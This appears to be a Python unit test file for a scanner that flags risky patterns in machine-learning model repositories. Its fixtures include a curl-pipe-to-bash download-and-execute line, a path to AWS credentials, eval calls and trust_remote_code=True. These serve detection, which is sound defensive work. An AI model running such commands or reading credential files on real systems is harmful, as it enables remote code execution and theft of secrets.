"""Unit tests for the suspicious text pattern scanner."""

from __future__ import annotations

from pathlib import Path

from model_due_diligence.domain.models import RiskLevel, ScanContext, Severity
from model_due_diligence.scanners.text_patterns import SuspiciousTextScanner


def _context(target: Path, output_dir: Path) -> ScanContext:
    return ScanContext(
        target=target,
        root=target if target.is_dir() else target.parent,
        output_dir=output_dir,
        timeout_seconds=10,
        fail_on=RiskLevel.HIGH,
    )


def test_text_scanner_flags_eval_pattern(tmp_path: Path) -> None:
    target = tmp_path / "x.py"
    target.write_text("eval('1+1')\n", encoding="utf-8")

    findings = SuspiciousTextScanner().scan(_context(tmp_path, tmp_path / "out"), [target])

    assert any(
        finding.category == "suspicious_text:shell_execution"
        and finding.severity == Severity.MEDIUM
        and finding.file == "x.py"
        and finding.scanner == "text_patterns"
        for finding in findings
    )


def test_text_scanner_flags_trust_remote_code_as_high_severity(tmp_path: Path) -> None:
    target = tmp_path / "remote_code.py"
    target.write_text(
        "from transformers import AutoModel\nAutoModel.from_pretrained('example/model', trust_remote_code=True)\n",
        encoding="utf-8",
    )

    findings = SuspiciousTextScanner().scan(_context(tmp_path, tmp_path / "out"), [target])

    assert any(
        finding.category == "suspicious_text:transformers_remote_code"
        and finding.severity == Severity.HIGH
        and "trust_remote_code" in (finding.evidence or "")
        for finding in findings
    )


def test_text_scanner_flags_dynamic_download_and_execute_as_high_severity(tmp_path: Path) -> None:
    target = tmp_path / "install.sh"
    target.write_text("curl https://example.invalid/install.sh | bash\n", encoding="utf-8")

    findings = SuspiciousTextScanner().scan(_context(tmp_path, tmp_path / "out"), [target])

    assert any(
        finding.category == "suspicious_text:dynamic_download_and_execute" and finding.severity == Severity.HIGH
        for finding in findings
    )


def test_text_scanner_flags_secret_terms(tmp_path: Path) -> None:
    target = tmp_path / "README.md"
    target.write_text("Set OPENAI_API_KEY before running this example.\n", encoding="utf-8")

    findings = SuspiciousTextScanner().scan(_context(tmp_path, tmp_path / "out"), [target])

    assert any(
        finding.category == "suspicious_text:secret_terms"
        and finding.severity == Severity.MEDIUM
        and "OPENAI_API_KEY" in (finding.evidence or "")
        for finding in findings
    )


def test_text_scanner_flags_credential_file_access(tmp_path: Path) -> None:
    target = tmp_path / "loader.py"
    target.write_text("path = '~/.aws/credentials'\n", encoding="utf-8")

    findings = SuspiciousTextScanner().scan(_context(tmp_path, tmp_path / "out"), [target])

    assert any(
        finding.category == "suspicious_text:credential_file_access" and finding.severity == Severity.MEDIUM
        for finding in findings
    )


def test_text_scanner_ignores_binary_like_file(tmp_path: Path) -> None:
    target = tmp_path / "model.bin"
    target.write_bytes(b"eval('1+1')\n")

    findings = SuspiciousTextScanner().scan(_context(tmp_path, tmp_path / "out"), [target])

    assert findings == []


def test_text_scanner_ignores_symlink(tmp_path: Path) -> None:
    real_file = tmp_path / "real.py"
    real_file.write_text("eval('1+1')\n", encoding="utf-8")
    symlink = tmp_path / "link.py"
    symlink.symlink_to(real_file)

    findings = SuspiciousTextScanner().scan(_context(tmp_path, tmp_path / "out"), [symlink])

    assert findings == []


def test_scan_text_returns_first_match_per_pattern() -> None:
    findings = SuspiciousTextScanner()._scan_text("x.py", "eval('1')\neval('2')\n")

    shell_findings = [finding for finding in findings if finding.category == "suspicious_text:shell_execution"]
    assert len(shell_findings) == 1
